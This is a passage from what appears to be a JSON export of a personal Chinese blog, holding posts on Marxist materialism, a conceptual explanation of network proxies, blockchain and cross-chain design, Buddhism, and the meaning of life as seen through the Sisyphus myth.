}","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"go","slug":"计算机/go","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/go/"}],"tags":[{"name":"gin","slug":"gin","permalink":"https://bighu630.github.io/tags/gin/"},{"name":"jwt","slug":"jwt","permalink":"https://bighu630.github.io/tags/jwt/"}],"author":"ivhu"},{"title":"对马克思唯物主义的思考","slug":"对马克思唯物主义的思考","date":"2023-07-01T04:00:00.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2023/07/01/对马克思唯物主义的思考/","permalink":"https://bighu630.github.io/2023/07/01/%E5%AF%B9%E9%A9%AC%E5%85%8B%E6%80%9D%E5%94%AF%E7%89%A9%E4%B8%BB%E4%B9%89%E7%9A%84%E6%80%9D%E8%80%83/","excerpt":"","text":"文章探讨了马克思的唯物主义和唯心主义之间的分歧。马克思的唯物主义强调物质决定意识，认为物质先于意识存在，并且人的意识是物质发展的结果。而唯心主义则认为意识决定物质，强调人的主观性。文章通过对比两者的观点，指出唯物主义能够使人扎根于现实世界，但也面临物质世界有限性的问题。作者偏向唯心主义观点，但承认马克思唯物主义在无产阶级哲学中的重要性和局限性。 什么是马克思的唯物主义？马克思唯物主义的观点大致可以总结为以下方面（就目前来看）。物质决定意识–物质先于意识存在，而意识则是物质发展到一定阶段的产物，客观上意识一定会随着物质的累积而产生。 但实际上唯心主义对意识的产生是持怀疑状态的。虽然意识已经产生，但是不能推断意识就是物质累积的必然产物。 首先最基本的是物质本来就存在（这是马克思与唯心主义都承认的）。但在这之后，这两种思想就开始分道扬镳，唯心主义认为物质仅仅是物质，而没有任何别的东西。除了物质之外就没有别的，没有苹果，没有水，没有桌子，因为他们都是物质而不是别的。那么随着物质的累积，我们如何把苹果在“物质”中分离出来的呢？ 这样看来唯心主义的思想大体是没什么问题的，物质先天存在，但“苹果”不存在。那苹果是怎么从不存在变成存在的。这也是唯心主义的的核心观点-人使得苹果从不存在变为存在。所以有存在主义的基本观点–人像一个手电筒一样照在苹果上，产生了苹果的影子，于是苹果存在。而唯心主义追寻的是这个手电筒。一种前存在，在苹果之前的存在。所以心是物质之前的存在，而存在者却无法照到他自己，致使唯心主义之后就一路神鬼妖魔，沦为手段（当然康德一再强调“人是目的而不是手段“）。 SO在我看来，马克思的批判是有问题的（但又像是没问题的）。唯心主义的确会将这些东西导向不可知论（显然的不可知命题，我不能照到我），宗教（神创我心）。但我依然认为在我所停止的地方（苹果的产生）唯心主义还是没问题的。我到目前对存在主义观点持认同状态。 唯物主义与唯心主义的分歧稍微退一点来讲，马克思的观点也是没什么大问题的，物质决定意识，就前面我们所说的人认识苹果来看，人认识苹果是因为苹果本来就存在，而不是不存在，马克思抓住的是物质的“本来存在”，苹果之存在促使人能够认识到苹果，而人在意识产生之后，人的意识使人有能力去作用于物质，物质先于意识可以保证人的意识可以反作用与物质。 对于唯心主义来讲，意识决定物质。表面上看意识对物质起决定作用，也就是人有极强的主观性，使得人可以上手物质，但是其实这恰恰使的人对物质丧失决定性，人作为主体决定物质而又操控物质。就如同加缪所打的比方一样：“人即是法官又是被告”，从而可以看出波伏娃所说的人有一种冲力–希望自身不存在。所以再次回一个动漫里面的一句很中二的话（王来承认，王来允许，王来背负整个世界）。再这个法官与被告的局势中，我需要我的宣判被允许。而资本主义夺取了这个允许权。唯心主义的根本失误在于把人推到了最前面，而这前面的风浪是人所不能忍受的（如同一本叫做 不能承受的生命之轻 的书），人之为人的难以承受，也就有了大宰治口中的“身而为人，我很抱歉”。人很难做这个法官。 所以在转过来看马克思的唯物主义，由物质决定意识，将人的意识通过物质锚定在现实世界中，而人由意识所产生的主观能动性则可以使人作用于物质世界，解决人生命的轻，如此，人不是法官，而只是被告，人通过主观作用于法官，从而促使案件的继续（历史的发展，等等）。于是乎马克思重新定义了劳动是什么–人由主观能动性去行动而作用于物质上的过程。马克思将人的存在以物质为基底，保证人不会对物质束手无策，于是乎人回归于现实世界。 总结在我看来，苹果的产生是物质世界与意识的一种契合。我更偏向于唯心主义的观点，但是我并不反驳马克思唯物主义的观点，他明确指出了唯心主义所存在的错误的导向性，但唯心主义所探讨的人之根本存在确实不容反驳的。在过程上，马克思唯物主义可以使得人能一步一个脚印的走下去，但实际上马克思唯物主义终究会遇到他的瓶颈，于个人而言物质世界的有限性（马克思的假设是物质世界的无限性）促使人会反观物质，也就是对物质本质的思考，那么他必然会重新找到唯心主义的关键–人把苹果从“物质”中分离出来。 所以说这么多，我想说什么？最后补充一下马克思对唯心主义的批判–首先马克思明确说明他的哲学是为无产阶级服务的（这是非常重要的，这也是他的哲学的局限性，也是他的哲学值得尊敬的地方，值得学习的地方）。 唯心主义的一个非常明显的问题-也就是上面所说的人很难去做那个法官。但不是说人不能做这个法官。但是大部分人又不会去成为这个法官，在现实中的表现就是阶级分化，由法官审判被告，而资产阶级篡取了法官的位置，使得法官直接作用于被告。 而马克思所做的事是重新将法官这个交给物质世界，让被告好好说话。所以马克思的异化在这场判决里表现为被告不得不依附于法官。从这个基本模型里可以推断出资本主义世界的基本逻辑，而正是这个基本逻辑，马克思可以推断出通过无产阶级革命，资本主义世界的必然灭亡，资产阶级将被赶下法官的位置。","categories":[{"name":"哲学","slug":"哲学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/"},{"name":"唯心主义","slug":"哲学/唯心主义","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%94%AF%E5%BF%83%E4%B8%BB%E4%B9%89/"}],"tags":[{"name":"马克思","slug":"马克思","permalink":"https://bighu630.github.io/tags/%E9%A9%AC%E5%85%8B%E6%80%9D/"},{"name":"唯心主义","slug":"唯心主义","permalink":"https://bighu630.github.io/tags/%E5%94%AF%E5%BF%83%E4%B8%BB%E4%B9%89/"}],"author":"ivhu"},{"title":"搭建一个网络代理","slug":"搭建一个网络代理","date":"2023-06-24T11:42:13.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2023/06/24/搭建一个网络代理/","permalink":"https://bighu630.github.io/2023/06/24/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/","excerpt":"","text":"这篇博客介绍了网络代理的基本概念，通过具体的网络请求流程解释了代理如何隐藏用户的访问记录，并详细描述了在使用代理时，计算机上发生的流量劫持和加密解密过程，最后提供了实战准备的建议，包括设置可用的代理服务器和域名解析服务，以便有效伪装代理请求。 什么是网络代理？首先我们简单聊一下一个正常的网络请求？ 比如我要上百度，也就是打开百度的主页。我们在浏览器的 网址栏输入www.baidu.com，然后回车，浏览器上显示 了百度的主页。 实际上这个过程是这样的 我们首先找DNS服务器问百度的ip地址是什么，然后再访问百度的IP地址。中间网关是指我们在内网，通过 内网的网关访问外网的DNS和百度。 在上面这个过程中。不仅百度知道我们在访问它，实际上网关，DNS服务器都知道我们在访问百度。而代理实际上是指利用一个服务器来代替我们访问百度，同时保证我们能正常与百度的服务器通信。 也就是这样 这样只有我们的代理服务器知道我们在访问百度，我们的网关会认为我在访问2.2.2.2，而我使用ip地址访问 代理服务器，也没有DNS服务。 当然这会让我们的流量比较特别，我们访问百度的流量都是访问2.2.2.2，但是2.2.2.2上什么都没有。 所以我们给代理服务器一个伪装域名。这样看起来我们就是在访问一个好像有用的网页一样。结构大概是这个样子： 当然这个过程中我们需要做一点小加密，使得我们的代理服务器只会为我们做代理，而不是任意人与他建立连接他都转发请求。 至此代理网络请求的流程大概就是这样的？ 在我们电脑上发生了什么？在我们使用代理来隐藏我们的网络请求后，我们在浏览器上面输入的依然是www.baidu.com，而不是www.dl.com。 要实现这一步，需要在我们电脑上装一个流量劫持的软件 在我们发个网关（我要www.baidu.com）之前，流量劫持软件首先获取了我的请求，然后对我们的做了一个包装。首先将我们的请求做一个加密，然后将加密后的数据构造一个发往www.dl.com的请求。 这样我们电脑拿到的网络请求就是发往www.dl.com的请求。通过这个请求我们将与我们的代理服务器建立一个连接。服务器将解密我们发往百度的请求，然后将百度的返回结果加密后返回给我们，我们的劫持将劫持代理服务器的返回结果，解密，转发给浏览器。 实战首先在实战之前，我们需要准备两个东西。 1,一个我们随时能连上器且能随时连上百度的服务器（作为代理服务器，如果不能随时链上我们可能随时上不了百度） 2， 一个呢够解析到我们代理服务器的域名，用于伪装我们的代理请求。 而对于中间的加密解密，流量劫持操作我们可以使用第三方的协议构建，比如vmess,xray,tragon等 域名服务可以使用duckdns.org上免费的二级域名","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"网络","slug":"计算机/网络","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"科学上网","slug":"科学上网","permalink":"https://bighu630.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"代理","slug":"代理","permalink":"https://bighu630.github.io/tags/%E4%BB%A3%E7%90%86/"}],"author":"ivhu"},{"title":"见佛","slug":"见佛","date":"2023-02-21T06:29:33.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2023/02/21/见佛/","permalink":"https://bighu630.github.io/2023/02/21/%E8%A7%81%E4%BD%9B/","excerpt":"","text":"昨日，入一庙，为见佛。见佛，不拜，因心不诚。又见一佛，不拜。再见一佛，不拜。绕寺一周，再入。见佛，拜也，心不诚。见佛，再拜，不诚。再见佛，不诚。离寺再拜，不诚。遂离。未见佛！","categories":[{"name":"随笔","slug":"随笔","permalink":"https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"见佛","slug":"见佛","permalink":"https://bighu630.github.io/tags/%E8%A7%81%E4%BD%9B/"}],"author":"ivhu"},{"title":"区块链-1","slug":"区块链-1","date":"2023-02-08T06:33:19.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2023/02/08/区块链-1/","permalink":"https://bighu630.github.io/2023/02/08/%E5%8C%BA%E5%9D%97%E9%93%BE-1/","excerpt":"","text":"关于我我目前在一家小公司里面实习，在区块链行业，从事区块链跨链的调研和代码结构分析,未来还不好说，但目前很舒服（实习不用存钱，不用担心没饭吃） 当下区块链我要谈的东西 公链，联盟链，开放链（联盟链的分支） DeFi NFT 元宇宙,VR DAO 公链与联盟链在某种意义上公链是唯一的区块链，联盟链只能算是个分布式结构。公链在理论上是一个绝对公平的结构，当然还是会受到资本和政治的影响，但是公链是有能力抵抗这种影响的。可以在与一般应用的对比中看到公链的独特性 一般应用是收法律和资本的强制，在加以方向性引导，从而实现发展公链则只受引导不受强制（当然某些时候引导像是强制一样） 公链,开放性，抗审查性，公链上的应用不一定是政治正确，资本正确的，当时应用的地位是相同的，不同的是资本和政治的炒作。在公链上合约（也就是应用）拥有相同的地位。 在我看来，公链必然不会被时间所淘汰，也就是公链在未来的发展中将会成为社会的基础设施。 因为公链实现了一种在链上的平等结构，但是 i 当下公链不会真正的成为一个社会必不可少的东西，因为这种超前时代有一点跟不上，当然也有可能是 这种技术推动人向 个人本位 的转化。 联盟链就差很多了，在公链的那些属性上基本没有继承到一点。 但联盟链可以解决一个稍微接近现实的问题，联盟内的共识问题。 区块链有这样一个属性：利用节点间的互不信任解决信任问题。但是联盟链只能算是稍微削弱了这种信任问题，从联盟链的共识算法可以看出来，基本就是拜占庭将军问题的解决与不解决，问题都是拜占庭将军问题，也就是联盟内用一个共同需求，就是要达成一致，在功能上只能是一个共识机制，共识机制的原由是大部分节点要有这个需求，而现在联盟链的需求就是没有需求创造需求。 区块链技术在联盟链上的真实作用– 多方监管，有点安全多方计算的意思，但是监管这个词恰恰与公链的属性相冲突。联盟链的数据存储方式也是区块链，区块链的联盟内的不可修改性是可以实现的，也就是说联盟链正真受益的对象是联盟成员，方便成员之间的相互监管，但是，依照区块链的监管要求，实现联盟内成员的相互监管就要求联盟内成员的互不信任。 所以就这个分析来看，联盟链真正能用到的地方很少，需要一个有强利益冲突的结构来运行这个系统，否则在联盟内部就是一个中心化结构，无非就是几个组织的董事会合到一起去开个会。 最后是开放链。 开放链算是联盟链的一次升级，突破联盟的壁垒，允许非联盟成员接入联盟链，但是这种可接入性有是受联盟本身审查的，联盟形成一种新型的中性化机构，并且他还披着去中性化的外皮，简直就是耍流氓。 DeFiDefi 算是区块链一次勇敢的尝试,这次尝试直接与金融挂钩，我认为 DeFi 应该是有发展前景的，但是还是有点超出时代了，也就是还只是富人玩的游戏，但目前股市还没玩够，Defi 只能算是股市的拓展，并没有什么真实的意义。目前的 defi 基本上就是大同小异，defi 的合约就那么几张，修修补补能发几千个 Defi,还能保证每一个的前端都是不一样的。大家的目的只有一个，圈钱，无论是被圈的还是圈钱的都一样。 但 defi 这个技术是没什么问题的，这种方式确实能解决中性化交易所的一些问题。 NFT目前的 NFT 就是一个笑话，当然我还是支持 NFT 这个技术 NFT 它解决了什么问题？NFT 体现了区块链的另外一个价值–数据标识，这也是 个人本位社会 的一个重要要求，人能够明确的知道什么是自己的什么不是自己的。利用数据标识技术，将人完完整整的在数据中划分出来。 目前的 NFT 是通过与艺术挂钩凸显它的价值，嗯～，这也是无可厚非的，因为数字藏品确实有它的存在价值，但是 i 目前的绝大多数数字藏凭都是圈钱。 关于 NFT 的一个延伸。DID–去中性化身份，以 DID 标识人的村存在，以 NFT 标识数据的归属。 元宇宙与元宇宙的强相关需要 NFT 来体现，也就是元宇宙中身份和元宇宙内物质的归属。目前存在这样一种轮调–元宇宙可以不基于区块链。这话没什么问题，没有区块链元宇宙也可以玩，但是我还是认为区块链将是一个社会的基础设置，元宇宙有可能成为推动他成为基础设施的道路。 DAO无政府主义的天堂 这也是我认为区块链能成为社会基础设施的理由之一，柏拉图的理想国就是这样一种社会（我虽然没看过，但我读过他的-苏格拉底的申辩），一种非政治主导的社会，政治存在，但是政治不是用来处罚，引导人，而是用来教育人，教育的目标不能是政治，政治的目标应该是教育，道德不能是政治道德。","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"author":"ivhu"},{"title":"被我误解多年的佛教","slug":"被我误解多年的佛教","date":"2022-12-09T06:40:06.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2022/12/09/被我误解多年的佛教/","permalink":"https://bighu630.github.io/2022/12/09/%E8%A2%AB%E6%88%91%E8%AF%AF%E8%A7%A3%E5%A4%9A%E5%B9%B4%E7%9A%84%E4%BD%9B%E6%95%99/","excerpt":"","text":"在这篇博客中，我反思了自己对佛教的理解，从最初的肤浅认知到逐渐领悟其中的深意，特别是“缘分”这一概念的偶然性与必然性，以及佛教关于出世与入世的智慧，探讨了人为何活着、业力与轮回的关系，最终领悟到我们所做的一切，实际上是为了消除过往的业力。 原谅我年少肤浅，将佛教理解为修行。 自我认识佛教以来，佛教 &#x3D;&#x3D;（这里使用两个等号）少林寺（寺庙），修行，禁欲，慈悲… 虽然单单在用词上我的描述大差不差，但是既然作为一个为人处事之道（现在我意识到的），他必然不是这些简单的条条框框（当然不理解佛教这些也挺难的） 最近听王德峰老师的课，有一个词我印象特别深–缘分。这是一个非常神奇的词，甚至可以说只有母语是中文的人才能真正理解它的含义（因为它是无法被翻译的，就像学英语的时候是不是先有桌子然后才有 table,而作为母语的时候对 [] 的理解是不是就是桌子–使用[]代替的原因是因为在这个地方不能用桌子，如果这都不懂，建议暂时不要看了），它与”历史“这个词很像–历史事件都具有非常大的偶然性（暂时没有什么具体的例子），但历史又是必然的（因为历史已经发生了，不容否定）所以说历史是偶然中的必然。而”缘分“则更神奇，缘分一词深刻的体现出它的偶然性–能遇见你，真的是缘分啊。浓浓的偶然性，但它又是必然的，因为缘分，我们必然相见。缘分同时拥有偶然性和必然性，但它就发生在眼前，缘分有点像西方哲学一直在寻找的那个填充虚无主义的（填充物[词穷])。这里暂时不做展开，但有一点要说明，缘分这个词，只有母语是中文的人能够理解，并且缘分不是神。 所以这里开始正式讲讲佛教这个话题，首先说一下误解，佛教的禁欲，修行，慈悲为怀等等等等，这些都是佛教的一部分，但这只是一半，按照正统说法，这是佛教给的出世的方法，这里就涉及到中国哲学的根本理念–出世，入世。 佛教的一个浅层理解–“尘世”，“尘世”形容的就是现实世界，这也是一直以来我对佛教的理解–脱离尘世。尘世的意思是满是灰尘的世界（想想看，这里简直就是现实世界），尘世之所以为尘世，是因为有个干净的东西–人&#x2F;自己&#x2F;我（或者说人的佛性）对比承托，所以佛教的一个浅层理解就是保持自身的干净（简单解释一下干净，存在就是不干净，绝对意义上的干净就是空），远离尘世，不要被尘世所污染，这里的一个浅层理解就是–空掉自己，自身是干净的，也就是自身是空的，而尘世这是空的对立面，来衬托空。 这就是我之前对佛教的理解，不被尘世中的（乱七八糟的东西[再一次词穷]）所污染，所以有少林寺，要修行，要斩断七情六欲，要以慈悲为怀….。当然空掉自己之后，人心并不是一无所有，人心会被自己的佛性填充，所以有“放下屠刀立地成佛”，佛教的佛性来源于自身，但被尘世所包裹，导致人看不清。不然如何立地成佛。 不过，如此理解，也只能是看到了佛教的冰山一角，佛教还有另外一半–入世 佛曰:“色即使空，空即是色”，色–指代事务的表象（各种表现新式），而“色即是空，空即是色”，这句话的意思是说，现实世界（尘世）也同我心一样干净，实际上更深层次的含义是将我的心拓展到整个世界。所以这就是为什么济公说：“酒肉穿肠肚，佛祖心中留”，世界本就空无一物，而我心中的佛性却不会被消散。这里涉及到佛教的第二个原理，入世，也就是我所忽视的，中国哲学从不是什么退隐的哲学，他包含着出世，和入世，人需要先出世，然后在入世，出世是要超越这个世界，突破世界法则对人的限制–退隐的基本逻辑，而后带着出世的智慧，再入世，去做自己该做的事情（这里引出了一个问题，做什么事）。佛教的出世有很有标志性，入世则没有，所以我认为我误解佛教是情有可原。 上面提到了去做我该做的事情，什么是我该做的事情，这个问题也是我的哲学的核心问题（我的哲学可以大致简化为 人，活着 -》活着你肯定在做点什么，只要你没死，你肯定在做点什么 -》所以我要做点什么？），我同样不知道我要做点什么，当然我的哲学有一个巨大的问题，人为什么要活着，我目前的解释是（人即不知道为什么要活着，也不知道为什么要去死，但人 活着，实际上有一个通向死亡的逻辑，人因为不想做任何事，于是乎人就有理由死了，但好像又存在逻辑漏洞，不可能便利所有可能，反正就是人死也死不了，活着又不知道做什么），当然佛教也没教人入世之后做什么，但我佛给了个让我苦笑不的的回答—你不是说人活着就是在做什么吗？你正在做的就是你该做的。懂？ 要理解佛对做什么的回答，的先了解佛教的一个核心概念—轮回 佛教是一个很有意思的宗教，如果你了解佛教，当你经历的事情越多，你就越相信他。 佛教的轮回观将人生从你的（这一世的）人生提升到你的轮回（所以要理解轮回不能只局限于当前这一世），但是两世之间有什么关系呢？（如果两世之间没有关系，那么轮回观是不成立的，反之，一旦两世之间存在联系，轮回就是成立的）佛教认为人是带着上一世的“业力”来到这一世，“业”—做什么的意思（不局限任何事务），业力就是要做某事的冲力，业力的表现方法是：厨师之所以想做厨师，老师之所以想做老师，我之所以想学区块链,毛泽东之所以成为毛泽东，这些都是业力，人是带着业力来到这个世界的，而人要做的就是消除这些业力，佛教称之为–消业 ，，，所以什么是缘分的必然性，这里刚好回答了，你我皆有业未消，都会在来世在消，来世之后又来世，来世之后再来世，于是乎–能遇见你，真的是缘分啊。不过为什么要消业呢？佛也有解释–天伦之乐。这也是我对佛教的误解之一，我一直以为天伦之乐是指极大的享受，但实际上天伦之乐说的是人消除所有的业，脱离轮回。这里需要注意，佛教是无神的，没有人要求我们轮回，但是当你有重要的的事没做，有重要的人没去爱，你会选择脱离轮回吗？天伦之乐的意思是，所有的业都消完了，实际上是说人是主动离开轮回的，而离开轮回的人就是天伦之乐。 那么为什么我会说经历的越多就越相信佛呢，因为经历的越多会让你更加的不明白你为什么做你做的那些是，佛的回答是，你在消业。 这里有一股浪漫主义风，人来到这个世界上就是为了不来到这个世界上，人为了消业所以来到这个世界上，该做毛主席的做毛主席，该写程序的写程序，生老病死，业没消的下一世，业消完了就天伦之乐了 当然消业的同时也会产生业，比如说我写了一个很好的程序（我消了我的业），但在我快死的时候程序出了个 bug（我含泪而终）于是我来到下一世的轮回，我又不知不觉间成了个程序员（或者类似的）。总之如此轮回。 所以我为什么做我做的这些事–消业。 最后补充一点，对于消业，算不上一个好东西。","categories":[{"name":"哲学","slug":"哲学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/"},{"name":"宗教","slug":"哲学/宗教","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%AE%97%E6%95%99/"}],"tags":[{"name":"沉思录","slug":"沉思录","permalink":"https://bighu630.github.io/tags/%E6%B2%89%E6%80%9D%E5%BD%95/"},{"name":"佛教","slug":"佛教","permalink":"https://bighu630.github.io/tags/%E4%BD%9B%E6%95%99/"},{"name":"业力","slug":"业力","permalink":"https://bighu630.github.io/tags/%E4%B8%9A%E5%8A%9B/"}],"author":"ivhu"},{"title":"为什么跨链这么麻烦","slug":"为什么跨链这么麻烦","date":"2022-12-03T06:37:16.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2022/12/03/为什么跨链这么麻烦/","permalink":"https://bighu630.github.io/2022/12/03/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%B7%A8%E9%93%BE%E8%BF%99%E4%B9%88%E9%BA%BB%E7%83%A6/","excerpt":"","text":"这篇博客探讨了跨链技术的挑战，分析了区块链去中心化和信任机制如何影响链间信息交互，并提出了BTC Relay、网关+中继链和预言机等解决方案，强调在实现跨链时需平衡去中心化与安全性。 跨链听上去是一个简单的事情跨链最基础的目标是，某一条链上发生的交易在另一条链上被认可，也就是链二同意链一上发的交易确实发生，然后以此为基础做一些操作，实际上就是链二能接受链一上产生的交易数据。 就单纯的用数据库来说，只需要链二提供接口给链一的客户端查询就可以了，就像支付宝能查到你银行卡里面还有多少钱一样。（当然这个实现得应该也挺复杂的，需要多层的身份认证–支付宝需要认证用户身份，银行需要认证支付宝身份，支付宝还不能拥有用户的银行身份），不过总归是有一个合理的实现。但是，对于区块链就不一样了。 为什么链间的信息交互这么难？在我看来，原因大概只有一个，区块链是一个去中心化，去信任的机构。 区块链内部本身就是节点间相互不可信的（当一个集体中相互之间都不信任，这时候少数服从多数就是一个很明智的共识，人越多，互不信任的越强，系统就越安全，当然区块链也设计了很多方案防止有个别人注册大量账户，冲大头），所以区块链的信任取决于而大多数节点真实的判断。 如果没有做出真实的判断就有可能受到共识算法中设计的惩罚，所以更多的节点愿意向组织提供真实的数据（这个涉及到区块链的奖励机制），除非有人提供超过奖励机制的钱给大多数节点，形成一个独权结构产生错误的结果。 所以区块链本生是不相信任何单点信息的，也就是说我们大可以在链上设计节点做 spv 验证，但是，来自少数节点的 spv 认证不会被大多数仍可，当然也可以设计成其他节点默认认可，但这将导致少数几个节点成为攻击的对象。 总结一下也就是：最终决定不能是少数节点认可的。 于是乎，最简单的解决方案就是让链上的大多数节点都能作为 spv 验证节点，来解决这个问题，但这样一方面会导致链上节点过于庞大，并且对于收费链来说也将消耗大量代币， 第一个解决方案 btc relay想法很简单，只要一条链上拥有另外一条链上的全部区块头，那么在链上认证时只需要验证一下默克尔树就可以了，这样每个节点都可以非常简单的认证区块信息。 但这有存在一个问题，谁来提供这个区块头，是一个人提供吗，如果是这不又是单点信任问题了吗？ 实际上这个项目最终真的是只有一个人在提供区块头（刚开始的时候人比较多，能在一定程度上做判断，如果有而已提供者也能发现出来），但是是每次向etc写入区块头都要消耗gas（钱），很多relayer放弃。所以在最近两年，最后一个relayer下线，btc relay dead。 btc relay的尝试向我们展示了跨链到底有多难，但他也慢慢暗示了区块链跨链比较大的可能性。简单分析一下btc relay 给我们什么提示了。 链间不依赖中间方的信息传递几乎是不可能的。 跨连通信并不需要某条链对另外一条链的交易达成共识，只需要一个能证明交易发生的数据即可。但这个数据又有可能存在单点信任问题。 要解决上面提到的单点信任问题，那么向链提供数据的结构就得是个去中心化的机构。 套娃跨链：因为去中心化的去信任关系，那么，这个去中心化的机构与链的数据交互就又需要一个去中心化的机构做桥。 网关+中继链网关+中继的方案是目前比较普遍的方案，向bitxhub就是典型网关+中继，这里目前不做展开，但感觉还是有点问题，如何保证网关不会出现问题呢，如果黑客入侵了某个网关，制作虚假的信息，中继链好像也是判断不出来。 预言机跨链后面两部分等我了解更多再写。 但目前可以大概总结一下我的观点 如果能加入网关，那么将会省很多事，而且网关几乎可以完成所有的链上操作。但网关将会带来一个极大的不确定性，并且网关存在中心化的风险 我认为网关需要保留，即使他的短板很明显，目前我个人干就需要处理的是削弱网关的权力，减少网关勇有的权限，比如说对交易进行hash锁定。另外还需要增加机制校验网关的忠诚，我个人感觉预言机在这方面可能有用武之地。","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"跨链","slug":"区块链/跨链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E8%B7%A8%E9%93%BE/"}],"tags":[{"name":"跨链","slug":"跨链","permalink":"https://bighu630.github.io/tags/%E8%B7%A8%E9%93%BE/"},{"name":"中继链","slug":"中继链","permalink":"https://bighu630.github.io/tags/%E4%B8%AD%E7%BB%A7%E9%93%BE/"},{"name":"跨链路由","slug":"跨链路由","permalink":"https://bighu630.github.io/tags/%E8%B7%A8%E9%93%BE%E8%B7%AF%E7%94%B1/"}],"author":"ivhu"},{"title":"什么是活着","slug":"什么是活着","date":"2022-09-10T12:10:08.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2022/09/10/什么是活着/","permalink":"https://bighu630.github.io/2022/09/10/%E4%BB%80%E4%B9%88%E6%98%AF%E6%B4%BB%E7%9D%80/","excerpt":"","text":"这篇文章从西西弗斯的神话故事切入，探讨了人生的虚无与意义，作者通过对西西弗斯永无止境地推石头的反思，提出了生活不是为了寻求意义，而是要认真面对活着这一事实，并思考如何在虚无中找到自己的信仰与方向。 先从一个神话故事入手希腊神话英雄人物西西弗斯的故事–西西弗斯是希腊半岛科林斯的国王，他曾欺骗死神，一度让人间没有死亡。死后，他在地狱里又说服死神让他回人间完成一件未了之事。结果，就在他回到人间那刹那，当他享受过阳光的照耀和水流的滋润，还看到了温暖的石头和大海时，他就再也不愿意回到黑暗的地狱之中了。众神在召唤、警告和愤怒都无效后，决定对他实施最严厉的惩罚：西西弗斯将永生永世地从山脚推一块巨石，每当巨石到达山顶后，石头又将滚回原点。他将在这周而复始的惩罚中，永世无望地劳作下去。 西西弗斯神话重点所描述的是西西弗斯被神惩罚的这一段，永世无望地劳作下去。毫无意义的活下去。他无法在“活着”之中找到意义，也没法赋予”生活“意义。将西西弗斯所接受的惩罚比作是人生是非常残忍的，但是，似乎大家都喜欢这么说。古希腊人对于人生意义给出了如下回答：人的最大幸福，「最好的全然不是你能得到一一不出生，不存在，成为虚无。但对于你第二好的是一一早死。」。而加谬通过西西弗斯神话留下了一句“西西弗斯是幸福的”。 为什么西西弗斯就是生活的写照？ 在我看来，因为生活中不可避免的存在这这样一种东西– 来自于某个固化的思想或者是一种人生的骗局 的因，我暂且把他定义无”卐“ #define 卐 固化的思想或者是一种人生的骗局 我曾就“我是选择考研还是就业？”这个问题寻找答案，但是我发现所有的我对考研的想法都可以归结于”卐“，可以大概还原一下– 我为什么考研？-&gt; 我希望能通过考研拿到更好的工作.-&gt;考研和工作有直接的联系吗？考研就能拿到更好的工作吗？什么是更好的工作，我如何评判？我的评判要基于我考研和工作的联系吗？我为什么相望更好的工作？-&gt; 答案依次是：有；不一定，但是概率更大；不知道；不知道；或许是为了钱，但是我的真正想回答的是能找一个我感兴趣，我愿意干的活 -&gt; 于是乎，所有问题指向了我对好的工作的评判，我的得到我对好的工作的评判从而得出我现在工作还是继续读研再找工作 -&gt; 那么问题又来了，什么是我感兴趣的，我该如何评判我是否有能力得到我感兴趣的工作？我如何得知我的兴趣与工作的匹配度？-&gt; 简化一下就是，我应该以多大的程度挑选一个与我兴趣有差异的工作？(当然这个问题的核心是不存在与我兴趣完全一样的工作，因为兴趣是会发生或多或少的变化.）-&gt; 我认为我很难找到那个准确的分界线，我甚至怀疑是否真的存在这么一个分界线，如果存在，有会遵守我的分界线吗，总感觉是在自己把自己提起来。 但是当”卐“出现的时候，无论他在什么地方，只要它偏向某那一方，就可以直接得到一个准确的答案。但是它的本质就是一个类似于谎言一样的东西，它就是虚无的替身。当你把生活的意义从”卐“中抽离出来，似乎意义就站不住脚，当我试图将”卐“从我的人生意义中抽离出去的时候，意义消失了，究其根本原因是，当做某件事是为了某件事的时候，就很难保证意义的存在。但却又不忍去想我为什么要怎么怎么样。当信念消失的时候，似乎我就是在玩一个游戏，内容就是我能多大程度的忍受我的人生意义源自与”卐“。于是当我再次寻找意义的时候，我已经没法坚定的称什么的意义是什么。 然而，即使是无意义，我依旧”活着“，不能说像，只能说我就是西西弗斯。所以按照古希腊的说法，我是不是该准备写写遗书，又或者是按照加谬所说：想象西西弗斯是幸福的，然后活着。我对此事的想法如何能脱离这两种想法给我带来的”卐“。 我对活着的理解我无法为活着找到意义，而且我也相信如果一味的去寻求意义，那么最后一定是竹篮打水一场空。所以我认为活着不是为了什么，我对活着的理解是：活着是什么。 让我再次回到西西弗斯的故事，对于西西弗斯来说，活着是什么？- &gt; 